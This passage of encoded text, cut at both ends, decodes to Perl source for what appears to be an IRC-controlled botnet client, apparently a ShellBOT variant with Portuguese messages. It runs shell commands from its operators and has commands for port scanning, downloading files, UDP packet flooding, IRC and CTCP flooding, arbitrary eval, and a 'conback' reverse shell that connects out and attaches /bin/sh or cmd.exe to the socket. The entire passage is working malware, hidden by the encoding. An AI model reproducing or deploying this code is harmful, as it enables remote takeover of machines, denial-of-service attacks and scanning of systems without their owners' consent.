(\"`@('T*(\"`@(\"`@?0H@(\"!]\"GT*\"G-U8B!P87)S92![\"B`@(&UY(\"1S97)V87)G(#T@<VAI_9G0[\"B`@(&EF(\"@D<V5R=F%R9R`]?B`O7E!)3D<@7#HH+BHI+RD@>PH@(\"`@('-E;F1R87<H(E!/3D<@.B0Q_(BD[\"B`@('T@96QS:68@*\"1S97)V87)G(#U^(\"]>7#HH+BL_*5PA*\"XK/RE<0\"@N*S\\I(%!2259-4T<@*\"XK_/RD@7#HH+BLI+RD@>PH@(\"`@(\"`@;7D@)'!N/20Q.R!M>2`D;VYD92`](\"0T.R!M>2`D87)G<R`](\"0U.PH@_(\"`@(\"`@:68@*\"1A<F=S(#U^(\"]>7#`P,59%4E-)3TY<,#`Q)\"\\I('L*(\"`@(\"`@(\"`@;F]T:6-E*\"(D<&XB_+\"`B7#`P,59%4E-)3TX@;4E20R!V-BXQ-B!%3D4@04Q)3B!'04)2245,7#`P,2(I.PH@(\"`@(\"`@?0H@(\"`@_(\"`@96QS:68@*\"1A<F=S(#U^(\"]>7#`P,5!)3D=<<RLH7&0K*5PP,#$D+RD@>PH@(\"`@(\"`@(\"!N;W1I8V4H_(B1P;B(L(\")<,#`Q4$].1UPP,#$B*3L*(\"`@(\"`@('T*(\"`@(\"`@(&5L<VEF(\"AG<F5P('LD7R`]?B`O7EQ1_)'!N7$4D+VD@?2!`861M<RD@>PH@(\"`@(\"`@(\"!I9B`H)&]N9&4@97$@(B1M975N:6-K(BE[\"B`@(\"`@(\"`@_(\"`@<VAE;&PH(B1P;B(L(\"(D87)G<R(I.PH@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@96QS:68@*\"1A<F=S(#U^_(\"]>*%Q1)&UE=6YI8VM<17Q<421P<F5F:7AO7$4I7',K*\"XJ*2\\@*2![\"B`@(\"`@(\"`@(\"`@(&UY(\"1N871R_:7@@/2`D,3L*(\"`@(\"`@(\"`@(\"`@;7D@)&%R9R`](\"0R.PH@(\"`@(\"`@(\"`@(\"!I9B`H)&%R9R`]?B`O7EPA_*\"XJ*2\\I('L*(\"`@(\"`@(\"`@(\"`@(\"!I<F-A<V4H(B1P;B(L(B1O;F1E(BPB)#$B*2!U;FQE<W,@*\"1N871R_:7@@97$@(B1P<F5F:7AO(B!A;F0@)&%R9R`]?B`O7EPA;FEC:R\\I.PH@(\"`@(\"`@(\"`@(\"!](&5L<VEF(\"@D_87)G(#U^(\"]>7$`H+BHI+RD@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@)&]N9&5P(#T@)&]N9&4[\"B`@(\"`@(\"`@(\"`@_(\"`@(\"`D;VYD97`@/2`D<&X@:68@)&]N9&4@97$@)&UE=6YI8VL[\"B`@(\"`@(\"`@(\"`@(\"`@(\"!B9G5N8R@B_)&]N9&5P(BPB)#$B*3L*(\"`@(\"`@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"`@(\"`@('-H96QL*\"(D;VYD_92(L(\"(D87)G(BD[\"B`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@?0H@(\"`@(\"`@?0H@(\"!](&5L<VEF(\"@D<V5R_=F%R9R`]?B`O7EPZ*\"XK/RE<(2@N*S\\I7$`H+BL_*5QS*TY)0TM<<RM<.BA<4RLI+VDI('L*(\"`@(\"`@(&EF_(\"AL8R@D,2D@97$@;&,H)&UE=6YI8VLI*2![\"B`@(\"`@(\"`@(\"1M975N:6-K/20T.PH@(\"`@(\"`@(\"`D:7)C_7W-E<G9E<G-[)$E20U]C=7)?<V]C:V5T?7LG;FEC:R=](#T@)&UE=6YI8VL[\"B`@(\"`@(\"!]\"B`@('T@96QS_:68@*\"1S97)V87)G(#U^(&TO7EPZ*\"XK/RE<<RLT,S,O:2D@>PH@(\"`@(\"`@)&UE=6YI8VL@/2!G971N:6-K_*\"D[\"B`@(\"`@(\"!N:6-K*\"(D;65U;FEC:R(I.PH@(\"!](&5L<VEF(\"@D<V5R=F%R9R`]?B!M+UY<.B@N*S\\I_7',K,#`Q7',K*%Q3*RE<<R]I*2![\"B`@(\"`@(\"`D;65U;FEC:R`](\"0R.PH@(\"`@(\"`@)&ER8U]S97)V97)S_>R1)4D-?8W5R7W-O8VME='U[)VYI8VLG?2`](\"1M975N:6-K.PH@(\"`@(\"`@)&ER8U]S97)V97)S>R1)4D-?_8W5R7W-O8VME='U[)VYO;64G?2`](\"(D,2([\"B`@(\"`@(\"!F;W)E86-H(&UY(\"1C86YA;\"`H0&-A;F%I<RD@_>PH@(\"`@(\"`@(\"!S96YD<F%W*\")*3TE.(\"1C86YA;\"(I.PH@(\"`@(\"`@?0H@(\"!]\"GT*\"G-U8B!B9G5N8R![_\"B`@;7D@)'!R:6YT;\"`](\"1?6S!=.PH@(&UY(\"1F=6YC87)G(#T@)%];,5T[\"B`@:68@*&UY(\"1P:60@/2!F_;W)K*2![\"B`@(\"`@=V%I='!I9\"@D<&ED+\"`P*3L*(\"!](&5L<V4@>PH@(\"`@(\"!I9B`H9F]R:RD@>PH@(\"`@_(\"`@(\"!E>&ET.PH@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"!I9B`H)&9U;F-A<F<@/7X@+UYP;W)T<V-A_;B`H+BHI+RD@>PH@(\"`@(\"`@(\"`@(\"`@;7D@)&AO<W1I<#TB)#$B.PH@(\"`@(\"`@(\"`@(\"`@;7D@0'!O<G1A_<STH(C(Q(BPB,C(B+\"(R,R(L(C(U(BPB-3,B+\"(X,\"(L(C$Q,\"(L(C$T,R(L(C8V-C4B*3L*(\"`@(\"`@(\"`@_(\"`@(&UY(\"A`86)E<G1A+\"`E<&]R=&%?8F%N;F5R*3L*(\"`@(\"`@(\"`@(\"`@(&9O<F5A8V@@;7D@)'!O<G1A_(\"A`<&]R=&%S*2`@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@;7D@)'-C86YS;V-K(#T@24\\Z.E-O8VME=#HZ24Y%5\"T^_;F5W*%!E97)!9&1R(#T^(\"1H;W-T:7`L(%!E97)0;W)T(#T^(\"1P;W)T82P@4')O=&\\@/3X@)W1C<\"<L(%1I_;65O=70@/3X@-\"D[\"B`@(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)'-C86YS;V-K*2![\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@_(\"!P=7-H(\"A`86)E<G1A+\"`D<&]R=&$I.PH@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@)'-C86YS;V-K+3YC;&]S93L*_(\"`@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@(&EF(\"A`86)E<G1A*2![\"B`@_(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))5DU31R`D<')I;G1L(#I0;W)T87,@_86)E<G1A<SH@0&%B97)T82(I.PH@(\"`@(\"`@(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"!S96YD_<F%W*\"1)4D-?8W5R7W-O8VME=\"PB4%))5DU31R`D<')I;G1L(#I.96YH=6UA('!O<G1A(&%B97)T82!F;VD@_96YC;VYT<F%D82XB*3L*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"!]\"@H@(\"`@(\"`@(\"`@(&5L<VEF(\"@D_9G5N8V%R9R`]?B`O7F1O=VYL;V%D7',K*\"XJ*5QS*R@N*BDO*2![\"B`@(\"`@(\"`@(\"`@(&=E='-T;W)E*\"(D_,2(L(\"(D,B(I.PH@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT_;\"`Z1&]W;FQO860@9&4@)#(@*\"0Q*2!#;VYC;'4N9&\\A(BD@:68@*\"1E<W1A=&ES=&EC87,I.PH@(\"`@(\"`@_(\"`@(\"!]\"@H@(\"`@(\"`@(\"`@(&5L<VEF(\"@D9G5N8V%R9R`]?B`O7F9U;&QP;W)T<V-A;EQS*R@N*BE<<RLH_7&0K*5QS*RA<9\"LI+RD@>PH@(\"`@(\"`@(\"`@(\"`@;7D@)&AO<W1N86UE/2(D,2([\"B`@(\"`@(\"`@(\"`@(\"!M_>2`D<&]R=&%I;FEC:6%L(#T@(B0R(CL*(\"`@(\"`@(\"`@(\"`@(&UY(\"1P;W)T869I;F%L(#T@(B0S(CL*(\"`@_(\"`@(\"`@(\"`@(&UY(\"A`86)E<G1A<RP@)7!O<G1A7V)A;FYE<BD[\"B`@(\"`@(\"`@(\"`@(\"!F;W)E86-H(&UY_(\"1P;W)T82`H)'!O<G1A:6YI8VEA;\"XN)'!O<G1A9FEN86PI\"B`@(\"`@(\"`@(\"`@(\"![\"B`@(\"`@(\"`@(\"`@_(\"`@(&UY(\"1S8V%N<V]C:R`]($E/.CI3;V-K970Z.DE.150M/FYE=RA0965R061D<B`]/B`D:&]S=&YA;64L_(%!E97)0;W)T(#T^(\"1P;W)T82P@4')O=&\\@/3X@)W1C<\"<L(%1I;65O=70@/3X@-\"D[\"B`@(\"`@(\"`@(\"`@_(\"`@(&EF(\"@D<V-A;G-O8VLI('L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"!P=7-H(\"A`86)E<G1A<RP@)'!O<G1A*3L*_(\"`@(\"`@(\"`@(\"`@(\"`@(\"`D<V-A;G-O8VLM/F-L;W-E.PH@(\"`@(\"`@(\"`@(\"`@(\"`@(&EF(\"@D97-T871I_<W1I8V%S*2![\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@_)'!R:6YT;\"`Z4&]R=&$@)'!O<G1A(&%B97)T82!E;2`D:&]S=&YA;64B*3L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"!]_\"B`@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@(&EF(\"A`86)E<G1A<RD@>PH@_(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT;\"`Z4&]R=&%S_(&%B97)T87,Z($!A8F5R=&%S(BD[\"B`@(\"`@(\"`@(\"`@(\"!](&5L<V4@>PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD_<F%W*\"1)4D-?8W5R7W-O8VME=\"PB4%))5DU31R`D<')I;G1L(#I.96YH=6UA('!O<G1A(&%B97)T82!F;VD@_96YC;VYT<F%D82XB*3L*(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@?0H*(\"`@(\"`@(\"`@(\"`@96QS:68@_*\"1F=6YC87)G(#U^(\"]>=61P7',K*\"XJ*5QS*RA<9\"LI7',K*%QD*RDO*2![\"B`@(\"`@(\"`@(\"`@(\"`@<F5T_=7)N('5N;&5S<R`D<&%C;W1E<SL*(\"`@(\"`@(\"`@(\"`@(\"!S;V-K970H5'(P>\"P@4$9?24Y%5\"P@4T]#2U]$_1U)!32P@,3<I.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1A;'9O/6EN971?871O;B@B)#$B*3L*(\"`@(\"`@(\"`@(\"`@_(\"!M>2`D<&]R=&$@/2`B)#(B.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1T96UP;R`](\"(D,R([\"B`@(\"`@(\"`@(\"`@_(\"`@;7D@)'!A8V]T93L*(\"`@(\"`@(\"`@(\"`@(\"!M>2`D<&%C;W1E<V4[\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)&9I_;2`]('1I;64@*R`D=&5M<&\\[\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)'!A8V]T82`](#$[\"B`@(\"`@(\"`@(\"`@(\"`@_=VAI;&4@*\"@D<&%C;W1A(#T](\"(Q(BD@)B8@*\"1P86-O=&5S(#T](\"(Q(BDI('L*(\"`@(\"`@(\"`@(\"`@(\"`@_(\"1P86-O=&$@/2`P(&EF(\"@H=&EM92`^/2`D9FEM*2`F)B`H)'1E;7!O(\"$](\"(P(BDI.PH@(\"`@(\"`@(\"`@_(\"`@(\"`@)'!A8V]T93TD<F%N9\"!X(\"1R86YD('@@)')A;F0[\"B`@(\"`@(\"`@(\"`@(\"`@(\"`D<&]R=&$@/2!I_;G0H<F%N9\"`V-3`P,\"D@*S$@:68@*\"1P;W)T82`]/2`B,\"(I.PH@(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9\"A4<C!X_+\"`P+\"`D<&%C;W1E+\"!S;V-K861D<E]I;B@D<&]R=&$L(\"1A;'9O*2D@86YD(\"1P86-O=&5S92LK(&EF(\"@D_<&%C;W1E<R`]/2`B,2(I.PH@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)&5S=&%T:7-T:6-A_<RD*(\"`@(\"`@(\"`@(\"`@(\"![\"B`@(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))_5DU31R`D<')I;G1L(#I<,#`R5&5M<&\\@9&4@4&%C;W1E<UPP,#(Z(\"1T96UP;R(N(G,B*3L*(\"`@(\"`@(\"`@_(\"`@(\"`@<V5N9')A=R@D25)#7V-U<E]S;V-K970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)4;W1A;\"!D92!0_86-O=&5S7#`P,CH@)'!A8V]T97-E(BD[\"B`@(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T_+\"`B4%))5DU31R`D<')I;G1L(#I<,#`R06QV;R!D;W,@4&%C;W1E<UPP,#(Z(\"0Q(BD[\"B`@(\"`@(\"`@(\"`@_(\"`@?0H@(\"`@(\"`@(\"`@(\"!]\"@H@(\"`@(\"`@(\"`@(\"!E;'-I9B`H)&9U;F-A<F<@/7X@+UYU9'!F86EX85QS_*R@N*BE<<RLH7&0K*5QS*RA<9\"LI+RD@>PH@(\"`@(\"`@(\"`@(\"`@(')E='5R;B!U;FQE<W,@)'!A8V]T97,[_\"B`@(\"`@(\"`@(\"`@(\"`@<V]C:V5T*%1R,'@L(%!&7TE.150L(%-/0TM?1$=204TL(#$W*3L*(\"`@(\"`@(\"`@_(\"`@(\"!M>2`D9F%I>&%I<#TB)#$B.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1P;W)T82`](\"(D,B([\"B`@(\"`@(\"`@_(\"`@(\"`@;7D@)'1E;7!O(#T@(B0S(CL*(\"`@(\"`@(\"`@(\"`@(\"!M>2`D<&%C;W1E.PH@(\"`@(\"`@(\"`@(\"`@_(&UY(\"1P86-O=&5S.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1F:6T@/2!T:6UE(\"L@)'1E;7!O.PH@(\"`@(\"`@(\"`@_(\"`@(&UY(\"1P86-O=&$@/2`Q.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1A;'9O.PH@(\"`@(\"`@(\"`@(\"`@('=H:6QE_(\"@D<&%C;W1A(#T](\"(Q(BD@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@)'!A8V]T82`](#`@:68@*\"AT:6UE(#X](\"1F_:6TI(\"8F(\"@D=&5M<&\\@(3T@(C`B*2D[\"B`@(\"`@(\"`@(\"`@(\"`@(\"!F;W(@*&UY(\"1F86EX82`](#$[(\"1F_86EX82`\\/2`R-34[(\"1F86EX82LK*2![\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"1A;'9O(#T@:6YE=%]A=&]N*\"(D_9F%I>&%I<\"XD9F%I>&$B*3L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@)'!A8V]T93TD<F%N9\"!X(\"1R86YD('@@)')A_;F0[\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"1P;W)T82`](&EN=\"AR86YD(#8U,#`P*2`K,2!I9B`H)'!O<G1A(#T]_(\"(P(BD[\"B`@(\"`@(\"`@(\"`@(\"`@(\"`@('-E;F0H5'(P>\"P@,\"P@)'!A8V]T92P@<V]C:V%D9')?:6XH)'!O_<G1A+\"`D86QV;RDI(&%N9\"`D<&%C;W1E<V4K*R!I9B`H)'!A8V]T97,@/3T@(C$B*3L*(\"`@(\"`@(\"`@(\"`@_(\"`@(\"`@:68@*\"1F86EX82`^/2`R-34I('L*(\"`@(\"`@(\"`@(\"`@(\"`@(\"`@(\"`D9F%I>&$@/2`Q.PH@(\"`@_(\"`@(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@(\"`@?0H@(\"`@(\"`@(\"`@(\"`@_(&EF(\"@D97-T871I<W1I8V%S*0H@(\"`@(\"`@(\"`@(\"`@('L*(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9')A=R@D25)#_7V-U<E]S;V-K970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)496UP;R!D92!086-O=&5S7#`P,CH@)'1E;7!O_(BXB<R(I.PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT_;\"`Z7#`P,E1O=&%L(&1E(%!A8V]T97-<,#`R.B`D<&%C;W1E<V4B*3L*(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9')A_=R@D25)#7V-U<E]S;V-K970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)!;'9O(&1O<R!086-O=&5S7#`P,CH@_)&%L=F\\B*3L*(\"`@(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@('T*\"B`@(\"`@(\"`@(\"`@(&5L<VEF(\"@D9G5N_8V%R9R`]?B`O7F-O;F)A8VM<<RLH+BHI7',K*%QD*RDO*2![\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)&AO<W0@/2`B_)#$B.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1P;W)T82`](\"(D,B([\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)'!R;W1O(#T@_9V5T<')O=&]B>6YA;64H)W1C<\"<I.PH@(\"`@(\"`@(\"`@(\"`@(&UY(\"1I861D<B`](&EN971?871O;B@D:&]S_=\"D[\"B`@(\"`@(\"`@(\"`@(\"`@;7D@)'!A9&1R(#T@<V]C:V%D9')?:6XH)'!O<G1A+\"`D:6%D9'(I.PH@(\"`@_(\"`@(\"`@(\"`@(&UY(\"1S:&5L;\"`](\"(O8FEN+W-H(\"UI(CL*(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)%Y/(&5Q(\")-_4U=I;C,R(BD@>PH@(\"`@(\"`@(\"`@(\"`@(\"`@)'-H96QL(#T@(F-M9\"YE>&4B.PH@(\"`@(\"`@(\"`@(\"`@('T*_(\"`@(\"`@(\"`@(\"`@(\"!S;V-K970H4T]#2T54+\"!01E])3D54+\"!33T-+7U-44D5!32P@)'!R;W1O*2!O<B!D_:64@(G-O8VME=#H@)\"$B.PH@(\"`@(\"`@(\"`@(\"`@(&-O;FYE8W0H4T]#2T54+\"`D<&%D9'(I(&]R(&1I92`B_8V]N;F5C=#H@)\"$B.PH@(\"`@(\"`@(\"`@(\"`@(&]P96XH4U1$24XL(\"(^)E-/0TM%5\"(I.PH@(\"`@(\"`@(\"`@_(\"`@(&]P96XH4U1$3U54+\"`B/B933T-+150B*3L*(\"`@(\"`@(\"`@(\"`@(\"!O<&5N*%-41$524BP@(CXF4T]#_2T54(BD[\"B`@(\"`@(\"`@(\"`@(\"`@<WES=&5M*\"(D<VAE;&PB*3L*(\"`@(\"`@(\"`@(\"`@(\"!C;&]S92A35$1)_3BD[\"B`@(\"`@(\"`@(\"`@(\"`@8VQO<V4H4U1$3U54*3L*(\"`@(\"`@(\"`@(\"`@(\"!C;&]S92A35$1%4E(I.PH*_(\"`@(\"`@(\"`@(\"`@(\"!I9B`H)&5S=&%T:7-T:6-A<RD*(\"`@(\"`@(\"`@(\"`@(\"![\"B`@(\"`@(\"`@(\"`@(\"`@_('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))5DU31R`D<')I;G1L(#I<,#`R0V]N96-T86YD;RUS92!E_;5PP,#(Z(\"1H;W-T.B1P;W)T82(I.PH@(\"`@(\"`@(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"`@?0H*(\"`@(\"`@(\"`@_(\"!E;'-I9B`H)&9U;F-A<F<@/7X@+UYO;&1P86-K7',K*\"XJ*5QS*RA<9\"LI7',K*%QD*RDO*2![\"B`@(\"`@_(\"`@(\"`@(')E='5R;B!U;FQE<W,@)'!A8V]T97,[\"B`@(\"`@(\"`@(\"`@(\"!M>2`H)&1T:6UE+\"`E<&%C;W1E_<RD@/2!A='1A8VME<B@B)#$B+\"`B)#(B+\"`B)#,B*3L*(\"`@(\"`@(\"`@(\"`@(\"1D=&EM92`](#$@:68@)&1T_:6UE(#T](#`[\"B`@(\"`@(\"`@(\"`@(\"!M>2`E8GET97,[\"B`@(\"`@(\"`@(\"`@(\"`D8GET97-[:6=M<'T@/2`D_,B`J(\"1P86-O=&5S>VEG;7!].PH@(\"`@(\"`@(\"`@(\"`@)&)Y=&5S>VEC;7!](#T@)#(@*B`D<&%C;W1E<WMI_8VUP?3L*(\"`@(\"`@(\"`@(\"`@(\"1B>71E<WMO?2`](\"0R(\"H@)'!A8V]T97-[;WT[\"B`@(\"`@(\"`@(\"`@(\"`D_8GET97-[=61P?2`](\"0R(\"H@)'!A8V]T97-[=61P?3L*(\"`@(\"`@(\"`@(\"`@(\"1B>71E<WMT8W!](#T@)#(@_*B`D<&%C;W1E<WMT8W!].PH@(\"`@(\"`@(\"`@(\"`@=6YL97-S(\"@D97-T871I<W1I8V%S*0H@(\"`@(\"`@(\"`@_(\"`@>PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT;\"`Z_7#`P,B`M(%-T871U<R`M7#`P,B(I.PH@(\"`@(\"`@(\"`@(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@_(E!2259-4T<@)'!R:6YT;\"`Z7#`P,E1I;7!<,#`R.B`D9'1I;64B+B)S96-U;F1E+B(I.PH@(\"`@(\"`@(\"`@_(\"`@(\"!S96YD<F%W*\"1)4D-?8W5R7W-O8VME=\"P@(E!2259-4T<@)'!R:6YT;\"`Z7#`P,E1O=&%L('!A8VME_=%PP,#(Z(\"(N*\"1P86-O=&5S>W5D<'T@*R`D<&%C;W1E<WMI9VUP?2`K(\"1P86-O=&5S>VEC;7!](\"L@(\"1P_86-O=&5S>V]]*2D[\"B`@(\"`@(\"`@(\"`@(\"`@('-E;F1R87<H)$E20U]C=7)?<V]C:V5T+\"`B4%))5DU31R`D_<')I;G1L(#I<,#`R5&]T86P@8GET97-<,#`R.B`B+B@D8GET97-[:6-M<'T@*R`D8GET97,@>VEG;7!](\"L@_)&)Y=&5S>W5D<'T@*R`D8GET97-[;WTI*3L*(\"`@(\"`@(\"`@(\"`@(\"`@<V5N9')A=R@D25)#7V-U<E]S;V-K_970L(\")04DE635-'(\"1P<FEN=&P@.EPP,#)&;&]O9%PP,#(Z(\"(N:6YT*\"@H)&)Y=&5S>VEC;7!]*R1B>71E_<WMI9VUP?2LD8GET97-[=61P?2`K(\"1B>71E<WMO?2DO,3`R-\"DO)&1T:6UE*2XB(&MB<',B*3L*(\"`@(\"`@_(\"`@(\"`@('T*(\"`@(\"`@(\"`@(\"!]\"B`@(\"`@(\"`@(\"`@97AI=#L*(\"`@(\"`@('T*(\"!]\"GT*\"G-U8B!I<F-A_<V4@>PH@(&UY(\"@D:V5M+\"`D<')I;G1L+\"`D8V%S92D@/2!`7SL*\"B`@(&EF(\"@D8V%S92`]?B`O7FIO:6X@_*\"XJ*2\\I('L*(\"`@(\"!J*\"(D,2(I.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7G!A<G0@*\"XJ*2\\I('L*_(\"`@(\"`@<\"@B)#$B*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYR96IO:6Y<<RLH+BHI+RD@>PH@(\"`@_(\"!M>2`D8VAA;B`](\"0Q.PH@(\"`@(\"!I9B`H)&-H86X@/7X@+UXH7&0K*2`H+BHI+RD@>PH@(\"`@(\"`@(&9O_<B`H;7D@)&-A(#T@,3L@)&-A(#P](\"0Q.R`D8V$K*R`I('L*(\"`@(\"`@(\"`@('`H(B0R(BD[\"B`@(\"`@(\"`@_(\"!J*\"(D,B(I.PH@(\"`@(\"`@('T*(\"`@(\"`@?2!E;'-E('L*(\"`@(\"`@(\"`@('`H(B1C:&%N(BD[\"B`@(\"`@_(\"`@(\"!J*\"(D8VAA;B(I.PH@(\"`@(\"!]\"B`@('T*(\"`@96QS:68@*\"1C87-E(#U^(\"]>;W`O*2![\"B`@(\"`@_(&]P*\"(D<')I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E<2`B;W`B.PH@(\"`@(\"!M>2`D;V%R9R`]('-U8G-T_<B@D8V%S92P@,RD[\"B`@(\"`@(&]P*\"(D,2(L(\"(D,B(I(&EF(\"@D;V%R9R`]?B`O*%Q3*RE<<RLH7%,K*2\\I_.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7F1E;W`O*2![\"B`@(\"`@(&1E;W`H(B1P<FEN=&PB+\"`B)&ME_;2(I(&EF(\"1C87-E(&5Q(\")D96]P(CL*(\"`@(\"`@;7D@)&]A<F<@/2!S=6)S='(H)&-A<V4L(#4I.PH@(\"`@_(\"!D96]P*\"(D,2(L(\"(D,B(I(&EF(\"@D;V%R9R`]?B`O*%Q3*RE<<RLH7%,K*2\\I.PH@(\"!]\"B`@(&5L<VEF_(\"@D8V%S92`]?B`O7G9O:6-E+RD@>PH@(\"`@(\"!V;VEC92@B)'!R:6YT;\"(L(\"(D:V5M(BD@:68@)&-A<V4@_97$@(G9O:6-E(CL*(\"`@(\"`@)&]A<F<@/2!S=6)S='(H)&-A<V4L(#8I.PH@(\"`@(\"!V;VEC92@B)#$B+\"`B_)#(B*2!I9B`H)&]A<F<@/7X@+RA<4RLI7',K*%Q3*RDO*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYD_979O:6-E+RD@>PH@(\"`@(\"!D979O:6-E*\"(D<')I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E<2`B9&5V;VEC_92([\"B`@(\"`@(\"1O87)G(#T@<W5B<W1R*\"1C87-E+\"`X*3L*(\"`@(\"`@9&5V;VEC92@B)#$B+\"`B)#(B*2!I_9B`H)&]A<F<@/7X@+RA<4RLI7',K*%Q3*RDO*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYM<V=<<RLH_7%,K*2`H+BHI+RD@>PH@(\"`@(\"!M<V<H(B0Q(BP@(B0R(BD[\"B`@('T*(\"`@96QS:68@*\"1C87-E(#U^(\"]>_9FQO;V1<<RLH7&0K*5QS*RA<4RLI(\"@N*BDO*2![\"B`@(\"`@(&9O<B`H;7D@)&-F(#T@,3L@)&-F(#P](\"0Q_.R`D8V8K*RD@>PH@(\"`@(\"`@(&US9R@B)#(B+\"`B)#,B*3L*(\"`@(\"`@?0H@(\"!]\"B`@(&5L<VEF(\"@D8V%S_92`]?B`O7F-T8W!F;&]O9%QS*RA<9\"LI7',K*%Q3*RD@*\"XJ*2\\I('L*(\"`@(\"`@9F]R(\"AM>2`D8V8@/2`Q_.R`D8V8@/#T@)#$[(\"1C9BLK*2![\"B`@(\"`@(\"`@8W1C<\"@B)#(B+\"`B)#,B*3L*(\"`@(\"`@?0H@(\"!]\"B`@_(&5L<VEF(\"@D8V%S92`]?B`O7F-T8W!<<RLH7%,K*2`H+BHI+RD@>PH@(\"`@(\"!C=&-P*\"(D,2(L(\"(D,B(I_.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7FEN=FET95QS*RA<4RLI(\"@N*BDO*2![\"B`@(\"`@(&EN=FET_92@B)#$B+\"`B)#(B*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYN:6-K(\"@N*BDO*2![\"B`@(\"`@(&YI_8VLH(B0Q(BD[\"B`@('T*(\"`@96QS:68@*\"1C87-E(#U^(\"]>8V]N96-T85QS*RA<4RLI7',K*%Q3*RDO*2![_\"B`@(\"`@(\"!C;VYE8W1A<B@B)#(B+\"`B)#$B+\"`V-C8W*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYS_96YD7',K*%Q3*RE<<RLH7%,K*2\\I('L*(\"`@(\"`@1$-#.CI314Y$*\"(D,2(L(\"(D,B(I.PH@(\"!]\"B`@(&5L_<VEF(\"@D8V%S92`]?B`O7G)A=R`H+BHI+RD@>PH@(\"`@(\"!S96YD<F%W*\"(D,2(I.PH@(\"!]\"B`@(&5L<VEF_(\"@D8V%S92`]?B`O7F5V86P@*\"XJ*2\\I('L*(\"`@(\"`@979A;\"`B)#$B.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S_92`]?B`O7F5N=')A7',K*%Q3*RE<<RLH7&0K*2\\I('L*(\"`@('-L965P(&EN=\"AR86YD*\"0R*2D[\"B`@(\"!J_*\"(D,2(I.PH@(\"!]\"B`@(&5L<VEF(\"@D8V%S92`]?B`O7G-A:5QS*RA<4RLI7',K*%QD*RDO*2![\"B`@(\"!S_;&5E<\"!I;G0H<F%N9\"@D,BDI.PH@(\"`@<\"@B)#$B*3L*(\"`@?0H@(\"!E;'-I9B`H)&-A<V4@/7X@+UYS86ER_+RD@>PH@(\"`@('%U:70H*3L